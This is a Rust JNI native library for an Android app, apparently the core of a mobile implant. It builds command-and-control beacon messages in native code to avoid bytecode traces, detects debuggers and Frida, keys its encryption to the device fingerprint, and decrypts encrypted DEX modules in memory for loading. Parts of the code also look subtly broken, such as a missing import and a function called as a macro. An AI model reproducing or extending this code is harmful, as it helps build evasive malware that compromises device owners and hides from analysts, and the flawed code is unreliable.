use jni::JNIEnv;
use jni::objects::{JClass, JString, JByteArray};
use jni::sys::{jbyteArray, jstring};
use std::sync::{Arc, Mutex};

mod crypto;
mod c2_protocol;
mod anti_debug;
mod environment;

use crypto::{AesCrypto, SessionKey};
use c2_protocol::C2Message;

// ============================================================================
// STATIC STATE (PROTECTED)
// ============================================================================

lazy_static::lazy_static! {
    static ref CRYPTO_CONTEXT: Arc<Mutex<CryptoContext>> = Arc::new(Mutex::new(CryptoContext::new()));
}

struct CryptoContext {
    session_keys: std::collections::HashMap<String, SessionKey>,
    message_counter: u64,
    last_rotation: std::time::SystemTime,
}

impl CryptoContext {
    fn new() -> Self {
        CryptoContext {
            session_keys: std::collections::HashMap::new(),
            message_counter: 0,
            last_rotation: std::time::SystemTime::now(),
        }
    }
}

// ============================================================================
// JNI: CRYPTO OPERATIONS
// ============================================================================

/// Encrypt message with AES-256-GCM
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_encryptMessage(
    env: JNIEnv,
    _class: JClass,
    plaintext: JByteArray,
    key_id: JString,
) -> jbyteArray {
    let plaintext_bytes = match env.convert_byte_array(&plaintext) {
        Ok(bytes) => bytes,
        Err(_) => return std::ptr::null_mut(),
    };

    let key_id_str = match env.get_string(&key_id) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return std::ptr::null_mut(),
    };

    let mut ctx = CRYPTO_CONTEXT.lock().unwrap();
    let session_key = match ctx.session_keys.get(&key_id_str) {
        Some(key) => key.clone(),
        None => return std::ptr::null_mut(),
    };

    // Increment message counter (anti-replay)
    ctx.message_counter += 1;
    let sequence = ctx.message_counter;

    drop(ctx); // Release lock

    // Perform encryption
    let ciphertext = match AesCrypto::encrypt(&plaintext_bytes, &session_key, sequence) {
        Ok(ct) => ct,
        Err(_) => return std::ptr::null_mut(),
    };

    // Return as jbyteArray
    match env.byte_array_from_slice(&ciphertext) {
        Ok(arr) => arr,
        Err(_) => std::ptr::null_mut(),
    }
}

/// Decrypt message with AES-256-GCM
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_decryptMessage(
    env: JNIEnv,
    _class: JClass,
    ciphertext: JByteArray,
    key_id: JString,
) -> jbyteArray {
    let ciphertext_bytes = match env.convert_byte_array(&ciphertext) {
        Ok(bytes) => bytes,
        Err(_) => return std::ptr::null_mut(),
    };

    let key_id_str = match env.get_string(&key_id) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return std::ptr::null_mut(),
    };

    let ctx = CRYPTO_CONTEXT.lock().unwrap();
    let session_key = match ctx.session_keys.get(&key_id_str) {
        Some(key) => key.clone(),
        None => return std::ptr::null_mut(),
    };

    drop(ctx);

    // Perform decryption
    let plaintext = match AesCrypto::decrypt(&ciphertext_bytes, &session_key) {
        Ok(pt) => pt,
        Err(_) => return std::ptr::null_mut(),
    };

    // Return as jbyteArray
    match env.byte_array_from_slice(&plaintext) {
        Ok(arr) => arr,
        Err(_) => std::ptr::null_mut(),
    }
}

/// Derive session key from device fingerprint (environmental keying)
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_deriveSessionKey(
    env: JNIEnv,
    _class: JClass,
    device_fingerprint: JString,
    key_id: JString,
) -> jstring {
    let fingerprint = match env.get_string(&device_fingerprint) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return std::ptr::null_mut(),
    };

    let key_id_str = match env.get_string(&key_id) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return std::ptr::null_mut(),
    };

    // Derive key using HKDF-SHA256
    let session_key = match SessionKey::derive_from_fingerprint(&fingerprint) {
        Ok(key) => key,
        Err(_) => return std::ptr::null_mut(),
    };

    // Store in context
    let mut ctx = CRYPTO_CONTEXT.lock().unwrap();
    ctx.session_keys.insert(key_id_str, session_key.clone());
    drop(ctx);

    // Return key hash for verification
    let key_hash = hex::encode(crypto::sha256(&session_key.key));
    match env.new_string(&key_hash) {
        Ok(s) => s.into_inner(),
        Err(_) => std::ptr::null_mut(),
    }
}

/// Rotate session key (periodically called)
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_rotateKey(
    env: JNIEnv,
    _class: JClass,
    key_id: JString,
) -> jboolean {
    let key_id_str = match env.get_string(&key_id) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let mut ctx = CRYPTO_CONTEXT.lock().unwrap();

    // Generate new key
    let new_key = SessionKey::generate();
    ctx.session_keys.insert(key_id_str, new_key);

    // Reset counter
    ctx.message_counter = 0;
    ctx.last_rotation = std::time::SystemTime::now();

    drop(ctx);
    1
}

// ============================================================================
// JNI: C2 PROTOCOL (ANTI-ANALYSIS RESISTANT)
// ============================================================================

/// Build BeaconMessage in native (no traces in Java bytecode)
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_network_NativeC2_buildBeaconMessage(
    env: JNIEnv,
    _class: JClass,
    device_id: JString,
    session_id: JString,
    message_type: JString,
    payload: JString,
) -> jbyteArray {
    let device_id_str = env.get_string(&device_id)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let session_id_str = env.get_string(&session_id)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let msg_type = env.get_string(&message_type)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let payload_str = env.get_string(&payload)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Build message in native
    let message = C2Message {
        device_id: device_id_str,
        session_id: session_id_str,
        message_type: msg_type,
        payload: serde_json::json!(payload_str),
        sequence: 0,
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64,
    };

    // Serialize to binary
    let binary = match bincode::serialize(&message) {
        Ok(b) => b,
        Err(_) => return std::ptr::null_mut(),
    };

    match env.byte_array_from_slice(&binary) {
        Ok(arr) => arr,
        Err(_) => std::ptr::null_mut(),
    }
}

// ============================================================================
// JNI: ANTI-DEBUG
// ============================================================================

/// Check if process is being debugged or analyzed
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_anti_NativeAntiDebug_isDetectionEnvironment(
    _env: JNIEnv,
    _class: JClass,
) -> jboolean {
    if anti_debug::is_debugger_attached() {
        return 1; // Debugger detected
    }

    if anti_debug::is_frida_loaded() {
        return 1; // Frida detected
    }

    if anti_debug::is_timing_anomalous() {
        return 1; // Timing attack detected
    }

    0 // Safe
}

/// Anti-tampering check (verify code integrity)
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_anti_NativeAntiDebug_verifyCodeIntegrity(
    env: JNIEnv,
    _class: JClass,
    expected_hash: JString,
) -> jboolean {
    let expected = match env.get_string(&expected_hash) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    let actual = anti_debug::calculate_library_hash();

    if actual == expected {
        1
    } else {
        0 // Code tampered
    }
}

// ============================================================================
// JNI: ENVIRONMENT VALIDATION
// ============================================================================

/// Validate device environment (environmental keying)
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_environment_NativeEnvironment_validateEnvironment(
    env: JNIEnv,
    _class: JClass,
    expected_fingerprint_hash: JString,
) -> jboolean {
    let expected = match env.get_string(&expected_fingerprint_hash) {
        Ok(s) => s.to_string_lossy().to_string(),
        Err(_) => return 0,
    };

    // Calculate actual device fingerprint (in native)
    let actual = match environment::get_device_fingerprint_hash() {
        Ok(hash) => hash,
        Err(_) => return 0,
    };

    if actual == expected {
        1
    } else {
        0 // Device fingerprint mismatch
    }
}

// ============================================================================
// MODULE SYSTEM: LOAD DEX IN-MEMORY
// ============================================================================

/// Load encrypted DEX module directly into memory
#[no_mangle]
pub extern "C" fn Java_com_random_package_name_modules_NativeModuleLoader_decryptAndLoadModule(
    env: JNIEnv,
    _class: JClass,
    encrypted_module: JByteArray,
    module_key: JString,
    module_name: JString,
) -> jbyteArray {
    let encrypted = match env.convert_byte_array(&encrypted_module) {
        Ok(bytes) => bytes,
        Err(_) => return std::ptr::null_mut(),
    };

    let key_str = env.get_string(&module_key)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let name = env.get_string(&module_name)
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Decrypt module
    let ctx = CRYPTO_CONTEXT.lock().unwrap();
    let key = match ctx.session_keys.get(&key_str) {
        Some(k) => k.clone(),
        None => return std::ptr::null_mut(),
    };
    drop(ctx);

    let decrypted = match AesCrypto::decrypt(&encrypted, &key) {
        Ok(d) => d,
        Err(_) => return std::ptr::null_mut(),
    };

    // Verify module hash
    let module_hash = crypto::sha256(&decrypted);
    android::log::info!("Module {} decrypted, hash: {}", name, hex::encode(&module_hash));

    // Return decrypted DEX
    match env.byte_array_from_slice(&decrypted) {
        Ok(arr) => arr,
        Err(_) => std::ptr::null_mut(),
    }
}

// ============================================================================
// UTILS
// ============================================================================

#[macro_use]
extern crate lazy_static;

mod android {
    pub mod log {
        pub fn info(msg: &str) {
            #[cfg(target_os = "android")]
            {
                use std::ffi::CString;
                let tag = CString::new("C2Native").unwrap();
                let msg = CString::new(msg).unwrap();
                unsafe {
                    libc::__android_log_write(
                        3, // INFO level
                        tag.as_ptr(),
                        msg.as_ptr(),
                    );
                }
            }
        }
    }
}
